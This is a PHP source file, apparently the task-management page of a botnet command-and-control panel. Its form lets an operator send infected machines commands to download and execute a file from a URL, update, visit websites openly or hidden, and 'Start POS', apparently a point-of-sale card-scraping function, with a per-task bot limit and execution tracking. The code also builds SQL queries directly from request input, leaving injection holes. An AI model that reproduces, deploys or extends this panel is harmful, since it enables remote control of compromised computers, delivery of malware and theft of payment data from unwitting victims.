<?php
$message = ''; 
include("config.php");
		if(isset($_POST["command"])){
			$message = '';
			$task = $_POST['command'];
			$parameter = $_POST['parameter'];
			$limit = $_POST['limit'];

			$parameter = strip_tags($parameter);
			$limit = strip_tags($limit);

			$task_id = time();
			if($task == 'visit'){
				$command = '2 ' . $parameter . ' ' . $task_id;
			}
			
			elseif($task == 'visithidden'){
				$command = '1 ' . $parameter . ' ' . $task_id;
			}
			elseif($task == 'visithidden'){
				
			}
			elseif($task == 'download'){
				$command = '3 ' . $parameter . ' ' . $task_id;
			}
			elseif($task == 'update'){
				$command = '4 ' . $parameter . ' ' . $task_id;
			}
			elseif($task == 'POS'){
				$command = '6 ' . $task_id;
			}
		$cmdhash = md5(time());
			if($stmt = $connection->prepare("INSERT INTO `tasks` (`cmd_hash`, `cmd`, `maxbots`, `id`) VALUES ('$cmdhash', '$command', '$limit', '$task_id')")){
			$stmt->execute();
			$message = '
				<div class="alert bg-success" role="alert">
					<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been added!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
				</div>
			';
		}
		else{
			echo '
			<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task could not be created!!!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
					';
		}
		}
		
		if(isset($_GET["task"]) && isset($_GET['id']) && !empty($_GET['id']) && isset($_GET['a']) && !empty($_GET['a'])){
		

			
			if($_GET['a'] == "supspend"){
				if($stmt = $connection->prepare("UPDATE `tasks` SET `status` = 2")){
					$stmt->execute();
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been supspended!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
				}
			}
			if($_GET['a'] == "reactivate"){
					if($stmt = $connection->prepare("UPDATE `tasks` SET `status` = 0")){
					$stmt->execute();
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been Reactivated!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
			}			
			}
			if($_GET['a'] == "remove"){
				
					$ids = 	$_GET['id'];
					if($stmt = $connection->prepare("DELETE FROM `tasks` WHERE `id` = '$ids'")){
					$stmt->execute();
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been removed!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
			}
			}
			
		}
		
	


?>
<!DOCTYPE html>
<html>
<?php
include("header.php");
?>
	<body>
<?php
include("sidebar.php");
?>

<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main" style="margin-top:10px;">			

	<div class="row">
		<div class="col-lg-12">
			<div class="panel panel-default">
				<?php 
		echo $message
		?>
				<div class="panel-heading">
				<center>	Task List
					<button type="button" class="btn btn-primary btn pull-right" data-toggle="modal" data-target="#myModal">New Task</button>
				</center>
					<!-- Modal -->
					<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
						<form action="" method="POST">
							<div class="modal-dialog" role="document">
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										<h4 class="modal-title" id="myModalLabel">New Task</h4>
									</div>
									<div class="modal-body">
										<div style="margin-bottom: 25px" class="input-group">
										
											<span class="input-group-addon"><b>Command</b></span>
											<select class="form-control" name="command">
												<option value="download">Download & Execute</option>
												<option value="update">Update</option>
												<option value="visit">Visit Website</option>
												<option value="visithidden">Visit Website Hidden</option>
												<option value="POS">Start POS</option>
											</select>
										</div>
										<div style="margin-bottom: 25px" class="input-group">
											<span class="input-group-addon"><b>Command Parameters</b></span>
											<input id="url" type="text" class="form-control" name="parameter" placeholder="Url and etc data...">
										</div>
										<div style="margin-bottom: 25px" class="input-group">
											<span class="input-group-addon"><b>Bot Limit</b></span>
											<input id="url" type="text" class="form-control" name="limit" placeholder="">
										</div>
									</div>
									<div class="modal-footer">
										<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
										<button type="submit" class="btn btn-primary">Create Task</button>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
				<div class="panel-body">
					<table data-toggle="table" data-url="botdata.php?task" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="name" data-sort-order="desc">
						<thead>
							<tr>
								<th data-field="task_id" data-sortable="true">Task ID</th>
								<th data-field="task_command"  data-sortable="true">Task Command</th>
								<th data-field="task_executed" data-sortable="true">Executed</th>
								<th data-field="task_failed" data-sortable="true">Failed</th>
								<th data-field="task_total" data-sortable="true">Total</th>
								<th data-field="task_added" data-sortable="true">Created On</th>
								<th data-field="task_status" data-sortable="true">Status</th> 
								<th data-field="task_actions" data-sortable="true"> </th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div><!--/.row-->	


</div>	<!--/.main-->
		<?php
		include("footer.php");
		
		
		?>
	</body>

</html>